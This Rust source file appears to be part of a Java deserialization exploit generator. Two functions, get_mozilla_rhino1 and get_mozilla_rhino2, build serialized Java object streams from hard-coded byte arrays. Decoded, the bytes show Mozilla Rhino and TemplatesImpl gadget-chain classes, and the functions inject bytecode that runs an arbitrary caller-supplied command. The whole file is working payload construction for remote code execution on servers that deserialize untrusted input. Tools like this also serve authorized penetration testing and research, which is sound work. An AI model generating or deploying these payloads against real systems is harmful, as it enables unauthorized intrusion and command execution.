use crate::template_impl::get_f_template_impl;

pub fn get_mozilla_rhino1(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [
        0, 7, 115, 114, 0, 33, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97,
        118, 97, 115, 99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 67, 97, 108, 108,
        152, 80, 13, 43, 129, 63, 210, 202, 2, 0, 2, 76, 0, 8, 102, 117, 110, 99, 116, 105, 111,
        110, 113, 0, 126, 0, 48, 91, 0, 12, 111, 114, 105, 103, 105, 110, 97, 108, 65, 114, 103,
        115, 113, 0, 126, 0, 182, 120, 113, 0, 126, 0, 27, 0, 0, 0, 0, 112, 113, 0, 126, 0, 35,
        113, 0, 126, 0, 42, 119, 4, 0, 0, 0, 0, 120, 119, 4, 0, 0, 0, 1, 120, 112, 112, 0, 0, 0, 1,
        0, 0, 0, 1, 1, 113, 0, 126, 1, 82, 113, 0, 126, 1, 85, 113, 0, 126, 1, 82, 115, 113, 0,
        126, 0, 50, 0, 2, 147, 74, 188, 235, 116, 0, 6, 83, 99, 114, 105, 112, 116, 115, 113, 0,
        126, 0, 53, 0, 0, 0, 0, 112, 113, 0, 126, 0, 35, 115, 114, 0, 35, 111, 114, 103, 46, 109,
        111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 78, 97,
        116, 105, 118, 101, 83, 99, 114, 105, 112, 116, 161, 178, 243, 126, 195, 84, 173, 156, 2,
        0, 1, 76, 0, 6, 115, 99, 114, 105, 112, 116, 116, 0, 31, 76, 111, 114, 103, 47, 109, 111,
        122, 105, 108, 108, 97, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 47, 83, 99, 114,
        105, 112, 116, 59, 120, 113, 0, 126, 0, 55, 0, 0, 0, 0, 112, 113, 0, 126, 0, 35, 113, 0,
        126, 0, 42, 119, 4, 0, 0, 0, 0, 120, 119, 4, 0, 0, 0, 4, 120, 0, 0, 0, 4, 112, 112, 119, 4,
        0, 0, 0, 0, 120, 119, 4, 0, 0, 0, 0, 120, 0, 0, 0, 7, 113, 0, 126, 1, 91, 0, 0, 0, 1, 0, 0,
        0, 1, 1, 113, 0, 126, 1, 87, 113, 0, 126, 1, 91, 113, 0, 126, 1, 87, 115, 113, 0, 126, 0,
        50, 0, 2, 74, 86, 108, 142, 113, 0, 126, 0, 39, 115, 113, 0, 126, 0, 53, 0, 0, 0, 0, 112,
        113, 0, 126, 0, 35, 112, 119, 4, 0, 0, 0, 0, 120, 119, 4, 0, 0, 0, 0, 120, 0, 0, 0, 7, 115,
        114, 0, 37, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115,
        99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 73, 116, 101, 114, 97, 116, 111,
        114, 198, 150, 137, 86, 98, 109, 198, 159, 2, 0, 1, 76, 0, 14, 111, 98, 106, 101, 99, 116,
        73, 116, 101, 114, 97, 116, 111, 114, 113, 0, 126, 0, 1, 120, 113, 0, 126, 0, 27, 0, 0, 0,
        0, 112, 113, 0, 126, 0, 35, 113, 0, 126, 0, 42, 119, 4, 0, 0, 0, 0, 120, 119, 4, 0, 0, 0,
        3, 120, 112, 0, 0, 0, 2, 0, 0, 0, 1, 1, 113, 0, 126, 0, 39, 113, 0, 126, 1, 95, 113, 0,
        126, 0, 39, 115, 113, 0, 126, 0, 50, 0, 2, 64, 188, 24, 219, 116, 0, 13, 83, 116, 111, 112,
        73, 116, 101, 114, 97, 116, 105, 111, 110, 113, 0, 126, 0, 41, 115, 114, 0, 50, 111, 114,
        103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112,
        116, 46, 83, 99, 114, 105, 112, 116, 97, 98, 108, 101, 79, 98, 106, 101, 99, 116, 36, 71,
        101, 116, 116, 101, 114, 83, 108, 111, 116, 187, 253, 169, 35, 115, 32, 29, 108, 2, 0, 2,
        76, 0, 6, 103, 101, 116, 116, 101, 114, 113, 0, 126, 0, 1, 76, 0, 6, 115, 101, 116, 116,
        101, 114, 113, 0, 126, 0, 1, 120, 113, 0, 126, 0, 50, 0, 2, 145, 172, 141, 9, 116, 0, 6,
        82, 101, 103, 69, 120, 112, 115, 114, 0, 39, 111, 114, 103, 46, 109, 111, 122, 105, 108,
        108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 76, 97, 122, 105, 108, 121,
        76, 111, 97, 100, 101, 100, 67, 116, 111, 114, 0, 0, 0, 0, 0, 0, 0, 1, 2, 0, 6, 90, 0, 6,
        115, 101, 97, 108, 101, 100, 73, 0, 5, 115, 116, 97, 116, 101, 76, 0, 9, 99, 108, 97, 115,
        115, 78, 97, 109, 101, 113, 0, 126, 0, 5, 76, 0, 16, 105, 110, 105, 116, 105, 97, 108, 105,
        122, 101, 100, 86, 97, 108, 117, 101, 113, 0, 126, 0, 1, 76, 0, 12, 112, 114, 111, 112,
        101, 114, 116, 121, 78, 97, 109, 101, 113, 0, 126, 0, 5, 76, 0, 5, 115, 99, 111, 112, 101,
        116, 0, 41, 76, 111, 114, 103, 47, 109, 111, 122, 105, 108, 108, 97, 47, 106, 97, 118, 97,
        115, 99, 114, 105, 112, 116, 47, 83, 99, 114, 105, 112, 116, 97, 98, 108, 101, 79, 98, 106,
        101, 99, 116, 59, 120, 112, 0, 0, 0, 0, 0, 116, 0, 42, 111, 114, 103, 46, 109, 111, 122,
        105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 114, 101, 103,
        101, 120, 112, 46, 78, 97, 116, 105, 118, 101, 82, 101, 103, 69, 120, 112, 112, 113, 0,
        126, 1, 100, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 48, 155, 185, 13,
        116, 0, 8, 80, 97, 99, 107, 97, 103, 101, 115, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0,
        116, 0, 43, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115,
        99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 74, 97, 118, 97, 84, 111, 112, 80,
        97, 99, 107, 97, 103, 101, 112, 113, 0, 126, 1, 106, 113, 0, 126, 0, 35, 112, 112, 115,
        113, 0, 126, 1, 98, 0, 2, 0, 49, 170, 34, 116, 0, 4, 106, 97, 118, 97, 115, 113, 0, 126, 1,
        101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108, 112, 113, 0, 126, 1, 110, 113, 0, 126, 0, 35, 112,
        112, 115, 113, 0, 126, 1, 98, 0, 2, 6, 3, 154, 150, 116, 0, 5, 106, 97, 118, 97, 120, 115,
        113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108, 112, 113, 0, 126, 1, 113, 113, 0,
        126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 0, 1, 174, 228, 116, 0, 3, 111, 114,
        103, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108, 112, 113, 0, 126, 1,
        116, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 0, 1, 129, 129, 116, 0,
        3, 99, 111, 109, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108, 112, 113, 0,
        126, 1, 119, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 0, 1, 135, 182,
        116, 0, 3, 101, 100, 117, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108,
        112, 113, 0, 126, 1, 122, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 0,
        1, 169, 157, 116, 0, 3, 110, 101, 116, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0,
        126, 1, 108, 112, 113, 0, 126, 1, 125, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1,
        98, 0, 2, 116, 67, 79, 194, 116, 0, 8, 103, 101, 116, 67, 108, 97, 115, 115, 115, 113, 0,
        126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 108, 112, 113, 0, 126, 1, 128, 113, 0, 126, 0,
        35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 108, 113, 238, 173, 116, 0, 11, 74, 97, 118,
        97, 65, 100, 97, 112, 116, 101, 114, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 116, 0, 34,
        111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114,
        105, 112, 116, 46, 74, 97, 118, 97, 65, 100, 97, 112, 116, 101, 114, 112, 113, 0, 126, 1,
        131, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 86, 119, 75, 116, 116, 0,
        12, 74, 97, 118, 97, 73, 109, 112, 111, 114, 116, 101, 114, 115, 113, 0, 126, 1, 101, 0, 0,
        0, 0, 0, 116, 0, 39, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118,
        97, 115, 99, 114, 105, 112, 116, 46, 73, 109, 112, 111, 114, 116, 101, 114, 84, 111, 112,
        76, 101, 118, 101, 108, 112, 113, 0, 126, 1, 135, 113, 0, 126, 0, 35, 112, 112, 115, 113,
        0, 126, 1, 98, 0, 2, 220, 181, 202, 87, 116, 0, 12, 67, 111, 110, 116, 105, 110, 117, 97,
        116, 105, 111, 110, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 116, 0, 41, 111, 114, 103, 46,
        109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46,
        78, 97, 116, 105, 118, 101, 67, 111, 110, 116, 105, 110, 117, 97, 116, 105, 111, 110, 112,
        113, 0, 126, 1, 139, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 0, 1, 83,
        247, 116, 0, 3, 88, 77, 76, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 116, 0, 41, 111, 114,
        103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112,
        116, 46, 120, 109, 108, 105, 109, 112, 108, 46, 88, 77, 76, 76, 105, 98, 73, 109, 112, 108,
        112, 113, 0, 126, 1, 143, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 182,
        220, 165, 53, 116, 0, 7, 88, 77, 76, 76, 105, 115, 116, 115, 113, 0, 126, 1, 101, 0, 0, 0,
        0, 0, 113, 0, 126, 1, 145, 112, 113, 0, 126, 1, 147, 113, 0, 126, 0, 35, 112, 112, 115,
        113, 0, 126, 1, 98, 0, 2, 194, 21, 117, 59, 116, 0, 9, 78, 97, 109, 101, 115, 112, 97, 99,
        101, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 145, 112, 113, 0, 126, 1,
        150, 113, 0, 126, 0, 35, 112, 112, 115, 113, 0, 126, 1, 98, 0, 2, 4, 154, 94, 124, 116, 0,
        5, 81, 78, 97, 109, 101, 115, 113, 0, 126, 1, 101, 0, 0, 0, 0, 0, 113, 0, 126, 1, 145, 112,
        113, 0, 126, 1, 153, 113, 0, 126, 0, 35, 112, 112, 120, 119, 4, 0, 0, 0, 0, 120, 112, 119,
        1, 0, 115, 114, 0, 58, 99, 111, 109, 46, 115, 117, 110, 46, 111, 114, 103, 46, 97, 112, 97,
        99, 104, 101, 46, 120, 97, 108, 97, 110, 46, 105, 110, 116, 101, 114, 110, 97, 108, 46,
        120, 115, 108, 116, 99, 46, 116, 114, 97, 120, 46, 84, 101, 109, 112, 108, 97, 116, 101,
        115, 73, 109, 112, 108, 9, 87, 79, 193, 110, 172, 171, 51, 3, 0, 6, 73, 0, 13, 95, 105,
        110, 100, 101, 110, 116, 78, 117, 109, 98, 101, 114, 73, 0, 14, 95, 116, 114, 97, 110, 115,
        108, 101, 116, 73, 110, 100, 101, 120, 91, 0, 10, 95, 98, 121, 116, 101, 99, 111, 100, 101,
        115, 116, 0, 3, 91, 91, 66, 91, 0, 6, 95, 99, 108, 97, 115, 115, 116, 0, 18, 91, 76, 106,
        97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 76, 0, 5, 95, 110, 97,
        109, 101, 113, 0, 126, 0, 5, 76, 0, 17, 95, 111, 117, 116, 112, 117, 116, 80, 114, 111,
        112, 101, 114, 116, 105, 101, 115, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105,
        108, 47, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255,
        255, 255, 255, 117, 114, 0, 3, 91, 91, 66, 75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0,
        120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66, 172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0,
        120, 112,
    ]
    .to_vec();
    let template_impl = get_f_template_impl(cmd);
    let template_impl_len = template_impl.len() as u32;
    result_bytes.extend(template_impl_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([
        112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 116, 0, 15, 106, 97, 118, 97, 46,
        108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 120, 119, 4, 0, 0, 0, 5, 115, 113, 0, 126, 1,
        98, 0, 0, 0, 51, 122, 139, 113, 0, 126, 0, 66, 113, 0, 126, 0, 129, 115, 114, 0, 32, 111,
        114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105,
        112, 116, 46, 77, 101, 109, 98, 101, 114, 66, 111, 120, 88, 62, 27, 230, 6, 227, 4, 181, 3,
        0, 0, 120, 112, 119, 2, 1, 1, 116, 0, 5, 101, 110, 116, 101, 114, 118, 114, 0, 30, 111,
        114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105,
        112, 116, 46, 67, 111, 110, 116, 101, 120, 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112,
        119, 2, 0, 0, 120, 112, 115, 113, 0, 126, 1, 98, 0, 0, 56, 235, 0, 7, 113, 0, 126, 0, 68,
        113, 0, 126, 0, 129, 115, 114, 0, 39, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97,
        46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 74, 97,
        118, 97, 77, 101, 116, 104, 111, 100, 208, 65, 78, 254, 114, 254, 105, 0, 2, 0, 2, 76, 0,
        12, 102, 117, 110, 99, 116, 105, 111, 110, 78, 97, 109, 101, 113, 0, 126, 0, 5, 91, 0, 7,
        109, 101, 116, 104, 111, 100, 115, 116, 0, 35, 91, 76, 111, 114, 103, 47, 109, 111, 122,
        105, 108, 108, 97, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 47, 77, 101, 109, 98,
        101, 114, 66, 111, 120, 59, 120, 113, 0, 126, 0, 55, 0, 0, 0, 0, 112, 112, 112, 119, 4, 0,
        0, 0, 0, 120, 119, 4, 0, 0, 0, 0, 120, 0, 0, 0, 4, 112, 113, 0, 126, 0, 68, 117, 114, 0,
        35, 91, 76, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115,
        99, 114, 105, 112, 116, 46, 77, 101, 109, 98, 101, 114, 66, 111, 120, 59, 50, 38, 33, 78,
        230, 33, 82, 57, 2, 0, 0, 120, 112, 0, 0, 0, 1, 115, 113, 0, 126, 1, 167, 119, 2, 1, 1,
        116, 0, 14, 110, 101, 119, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 118, 113,
        0, 126, 1, 155, 119, 2, 0, 0, 120, 112, 120, 119, 4, 0, 0, 0, 0, 120,
    ]);
    result_bytes
}
pub fn get_mozilla_rhino2(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [
        172, 237, 0, 5, 115, 114, 0, 39, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46,
        106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 74, 97, 118,
        97, 79, 98, 106, 101, 99, 116, 159, 145, 165, 158, 53, 196, 49, 225, 3, 0, 2, 76, 0, 6,
        112, 97, 114, 101, 110, 116, 116, 0, 35, 76, 111, 114, 103, 47, 109, 111, 122, 105, 108,
        108, 97, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 47, 83, 99, 114, 105, 112, 116,
        97, 98, 108, 101, 59, 76, 0, 9, 112, 114, 111, 116, 111, 116, 121, 112, 101, 113, 0, 126,
        0, 1, 120, 112, 115, 114, 0, 46, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46,
        106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 116, 111, 111, 108, 115, 46, 115, 104,
        101, 108, 108, 46, 69, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 250, 5, 191, 187,
        59, 216, 141, 87, 2, 0, 1, 76, 0, 20, 116, 104, 101, 80, 114, 111, 116, 111, 116, 121, 112,
        101, 73, 110, 115, 116, 97, 110, 99, 101, 116, 0, 48, 76, 111, 114, 103, 47, 109, 111, 122,
        105, 108, 108, 97, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 47, 116, 111, 111,
        108, 115, 47, 115, 104, 101, 108, 108, 47, 69, 110, 118, 105, 114, 111, 110, 109, 101, 110,
        116, 59, 120, 114, 0, 39, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97,
        118, 97, 115, 99, 114, 105, 112, 116, 46, 83, 99, 114, 105, 112, 116, 97, 98, 108, 101, 79,
        98, 106, 101, 99, 116, 101, 206, 20, 114, 143, 196, 24, 228, 3, 0, 4, 73, 0, 5, 99, 111,
        117, 110, 116, 76, 0, 16, 97, 115, 115, 111, 99, 105, 97, 116, 101, 100, 86, 97, 108, 117,
        101, 115, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59,
        76, 0, 17, 112, 97, 114, 101, 110, 116, 83, 99, 111, 112, 101, 79, 98, 106, 101, 99, 116,
        113, 0, 126, 0, 1, 76, 0, 15, 112, 114, 111, 116, 111, 116, 121, 112, 101, 79, 98, 106,
        101, 99, 116, 113, 0, 126, 0, 1, 120, 112, 0, 0, 0, 0, 115, 114, 0, 19, 106, 97, 118, 97,
        46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 116, 97, 98, 108, 101, 19, 187, 15, 37, 33,
        74, 228, 184, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 73, 0, 9,
        116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63, 64, 0, 0, 0, 0, 0, 8, 119, 8, 0,
        0, 0, 11, 0, 0, 0, 1, 116, 0, 10, 67, 108, 97, 115, 115, 67, 97, 99, 104, 101, 115, 114, 0,
        33, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99,
        114, 105, 112, 116, 46, 67, 108, 97, 115, 115, 67, 97, 99, 104, 101, 132, 244, 196, 52,
        150, 220, 31, 41, 2, 0, 2, 90, 0, 16, 99, 97, 99, 104, 105, 110, 103, 73, 115, 69, 110, 97,
        98, 108, 101, 100, 73, 0, 20, 103, 101, 110, 101, 114, 97, 116, 101, 100, 67, 108, 97, 115,
        115, 83, 101, 114, 105, 97, 108, 120, 112, 0, 0, 0, 0, 0, 120, 112, 112, 119, 4, 0, 0, 0,
        0, 120, 113, 0, 126, 0, 7, 112, 119, 1, 1, 116, 0, 16, 106, 97, 118, 97, 46, 108, 97, 110,
        103, 46, 79, 98, 106, 101, 99, 116, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97,
        110, 103, 46, 83, 116, 114, 105, 110, 103, 59, 173, 210, 86, 231, 233, 29, 123, 71, 2, 0,
        0, 120, 112, 0, 0, 0, 0, 115, 114, 0, 38, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108,
        97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 78, 97, 116, 105, 118, 101, 74,
        97, 118, 97, 65, 114, 114, 97, 121, 243, 45, 54, 97, 239, 120, 241, 59, 2, 0, 3, 73, 0, 6,
        108, 101, 110, 103, 116, 104, 76, 0, 5, 97, 114, 114, 97, 121, 116, 0, 18, 76, 106, 97,
        118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 3, 99, 108, 115,
        116, 0, 17, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59,
        120, 113, 0, 126, 0, 0, 113, 0, 126, 0, 7, 115, 113, 0, 126, 0, 3, 0, 0, 0, 1, 112, 115,
        113, 0, 126, 0, 0, 113, 0, 126, 0, 7, 112, 119, 1, 1, 113, 0, 126, 0, 13, 117, 113, 0, 126,
        0, 14, 0, 0, 0, 0, 115, 113, 0, 126, 0, 3, 0, 0, 0, 1, 112, 112, 112, 119, 4, 0, 0, 0, 5,
        115, 114, 0, 50, 111, 114, 103, 46, 109, 111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97,
        115, 99, 114, 105, 112, 116, 46, 83, 99, 114, 105, 112, 116, 97, 98, 108, 101, 79, 98, 106,
        101, 99, 116, 36, 71, 101, 116, 116, 101, 114, 83, 108, 111, 116, 187, 253, 169, 35, 115,
        32, 29, 108, 2, 0, 2, 76, 0, 6, 103, 101, 116, 116, 101, 114, 113, 0, 126, 0, 17, 76, 0, 6,
        115, 101, 116, 116, 101, 114, 113, 0, 126, 0, 17, 120, 114, 0, 44, 111, 114, 103, 46, 109,
        111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 83, 99,
        114, 105, 112, 116, 97, 98, 108, 101, 79, 98, 106, 101, 99, 116, 36, 83, 108, 111, 116,
        171, 121, 232, 59, 227, 133, 120, 157, 2, 0, 4, 83, 0, 10, 97, 116, 116, 114, 105, 98, 117,
        116, 101, 115, 73, 0, 11, 105, 110, 100, 101, 120, 79, 114, 72, 97, 115, 104, 76, 0, 4,
        110, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116,
        114, 105, 110, 103, 59, 76, 0, 5, 118, 97, 108, 117, 101, 113, 0, 126, 0, 17, 120, 112, 0,
        0, 0, 1, 140, 198, 116, 0, 3, 102, 111, 111, 112, 115, 114, 0, 32, 111, 114, 103, 46, 109,
        111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 77,
        101, 109, 98, 101, 114, 66, 111, 120, 88, 62, 27, 230, 6, 227, 4, 181, 3, 0, 0, 120, 112,
        119, 2, 1, 1, 116, 0, 5, 101, 110, 116, 101, 114, 118, 114, 0, 30, 111, 114, 103, 46, 109,
        111, 122, 105, 108, 108, 97, 46, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 46, 67,
        111, 110, 116, 101, 120, 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 119, 2, 0, 0, 120,
        112, 120, 113, 0, 126, 0, 23, 112, 120, 112, 119, 4, 0, 0, 0, 5, 115, 113, 0, 126, 0, 25,
        0, 0, 204, 201, 245, 20, 116, 0, 16, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101,
        114, 116, 105, 101, 115, 112, 120, 113, 0, 126, 0, 20, 119, 1, 0, 115, 114, 0, 58, 99, 111,
        109, 46, 115, 117, 110, 46, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 120, 97, 108,
        97, 110, 46, 105, 110, 116, 101, 114, 110, 97, 108, 46, 120, 115, 108, 116, 99, 46, 116,
        114, 97, 120, 46, 84, 101, 109, 112, 108, 97, 116, 101, 115, 73, 109, 112, 108, 9, 87, 79,
        193, 110, 172, 171, 51, 3, 0, 6, 73, 0, 13, 95, 105, 110, 100, 101, 110, 116, 78, 117, 109,
        98, 101, 114, 73, 0, 14, 95, 116, 114, 97, 110, 115, 108, 101, 116, 73, 110, 100, 101, 120,
        91, 0, 10, 95, 98, 121, 116, 101, 99, 111, 100, 101, 115, 116, 0, 3, 91, 91, 66, 91, 0, 6,
        95, 99, 108, 97, 115, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47,
        67, 108, 97, 115, 115, 59, 76, 0, 5, 95, 110, 97, 109, 101, 113, 0, 126, 0, 26, 76, 0, 17,
        95, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 116, 0,
        22, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 80, 114, 111, 112, 101, 114, 116,
        105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255, 255, 255, 255, 117, 114, 0, 3, 91, 91, 66,
        75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0, 120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66,
        172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0, 120, 112,
    ]
    .to_vec();
    let template_impl = get_f_template_impl(cmd);
    let template_impl_len = template_impl.len() as u32;
    result_bytes.extend(template_impl_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([
        112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 112, 120, 0, 0, 0, 0, 112, 112,
        112, 120,
    ]);
    result_bytes
}
